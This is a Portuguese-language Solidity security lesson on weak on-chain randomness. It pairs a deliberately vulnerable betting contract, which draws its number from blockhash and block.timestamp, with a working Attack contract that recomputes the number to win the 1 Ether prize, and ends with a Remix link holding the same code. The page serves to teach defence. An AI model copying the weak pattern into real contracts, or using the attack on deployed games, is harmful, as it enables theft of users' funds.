# Fonte de Aleatoriedade

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

`blockhash` e `block.timestamp` não são fontes confiáveis de ateatoriedade.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
NOTA: não pode usar blockhash no Remix, então use ganache-cli

npm i -g ganache-cli
ganache-cli
No remix troque o ambiente para o provedor Web3
*/

/*
GuessTheRandomNumber é um jogo onde você ganha 1 Ether se você advinhar
um número pseudo aleatório gerado de um bloco de hash e timestamp.

À primeira vista, parece impossível advinhar o número correto.
Mas vamos ver como é fácil ganhar.

1. Alice implanta GuessTheRandomNumber com 1 Ether
2. Eve implementa Attack
3. Eve chama Attack.attack() e ganha 1 Ether

O que aconteceu?
Attack computou a resposta correta simplesmente copiando o código que computa
o número aleatório
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Função Helper para checar o balanço
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

</h4><a href="#preventative-techniques" id="preventative-techniques">Técnicas preventivas</a></h4>

- Não use `blockhash` e `block.timestamp` como fonte de aleatoriedade

## Teste no Remix

- [Randomness.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCi8qCk5PVEE6IG5hbyBwb2RlIHVzYXIgYmxvY2toYXNoIG5vIFJlbWl4LCBlbnRhbyB1c2UgZ2FuYWNoZS1jbGkKCm5wbSBpIC1nIGdhbmFjaGUtY2xpCmdhbmFjaGUtY2xpCk5vIHJlbWl4IHRyb3F1ZSBvIGFtYmllbnRlIHBhcmEgbyBwcm92ZWRvciBXZWIzCiovCgovKgpHdWVzc1RoZVJhbmRvbU51bWJlciBlIHVtIGpvZ28gb25kZSB2b2NlIGdhbmhhIDEgRXRoZXIgc2Ugdm9jZSBhZHZpbmhhcgp1bSBudW1lcm8gcHNldWRvIGFsZWF0b3JpbyBnZXJhZG8gZGUgdW0gYmxvY28gZGUgaGFzaCBlIHRpbWVzdGFtcC4KCkEgcHJpbWVpcmEgdmlzdGEsIHBhcmVjZSBpbXBvc3NpdmVsIGFkdmluaGFyIG8gbnVtZXJvIGNvcnJldG8uCk1hcyB2YW1vcyB2ZXIgY29tbyBlIGZhY2lsIGdhbmhhci4KCjEuIEFsaWNlIGltcGxhbnRhIEd1ZXNzVGhlUmFuZG9tTnVtYmVyIGNvbSAxIEV0aGVyCjIuIEV2ZSBpbXBsZW1lbnRhIEF0dGFjawozLiBFdmUgY2hhbWEgQXR0YWNrLmF0dGFjaygpIGUgZ2FuaGEgMSBFdGhlcgoKTyBxdWUgYWNvbnRlY2V1PwpBdHRhY2sgY29tcHV0b3UgYSByZXNwb3N0YSBjb3JyZXRhIHNpbXBsZXNtZW50ZSBjb3BpYW5kbyBvIGNvZGlnbyBxdWUgY29tcHV0YSAKbyBudW1lcm8gYWxlYXRvcmlvCiovCgpjb250cmFjdCBHdWVzc1RoZVJhbmRvbU51bWJlciB7CiAgICBjb25zdHJ1Y3RvcigpIHBheWFibGUge30KCiAgICBmdW5jdGlvbiBndWVzcyh1aW50IF9ndWVzcykgcHVibGljIHsKICAgICAgICB1aW50IGFuc3dlciA9IHVpbnQoCiAgICAgICAgICAgIGtlY2NhazI1NihhYmkuZW5jb2RlUGFja2VkKGJsb2NraGFzaChibG9jay5udW1iZXIgLSAxKSwgYmxvY2sudGltZXN0YW1wKSkKICAgICAgICApOwoKICAgICAgICBpZiAoX2d1ZXNzID09IGFuc3dlcikgewogICAgICAgICAgICAoYm9vbCBzZW50LCApID0gbXNnLnNlbmRlci5jYWxse3ZhbHVlOiAxIGV0aGVyfSgiIik7CiAgICAgICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CiAgICAgICAgfQogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgcmVjZWl2ZSgpIGV4dGVybmFsIHBheWFibGUge30KCiAgICBmdW5jdGlvbiBhdHRhY2soR3Vlc3NUaGVSYW5kb21OdW1iZXIgZ3Vlc3NUaGVSYW5kb21OdW1iZXIpIHB1YmxpYyB7CiAgICAgICAgdWludCBhbnN3ZXIgPSB1aW50KAogICAgICAgICAgICBrZWNjYWsyNTYoYWJpLmVuY29kZVBhY2tlZChibG9ja2hhc2goYmxvY2subnVtYmVyIC0gMSksIGJsb2NrLnRpbWVzdGFtcCkpCiAgICAgICAgKTsKCiAgICAgICAgZ3Vlc3NUaGVSYW5kb21OdW1iZXIuZ3Vlc3MoYW5zd2VyKTsKICAgIH0KCiAgICAvLyBGdW5jYW8gSGVscGVyIHBhcmEgY2hlY2FyIG8gYmFsYW5jbwogICAgZnVuY3Rpb24gZ2V0QmFsYW5jZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKHVpbnQpIHsKICAgICAgICByZXR1cm4gYWRkcmVzcyh0aGlzKS5iYWxhbmNlOwogICAgfQp9&version=soljson-v0.8.13+commit.abaa5c0e.js)
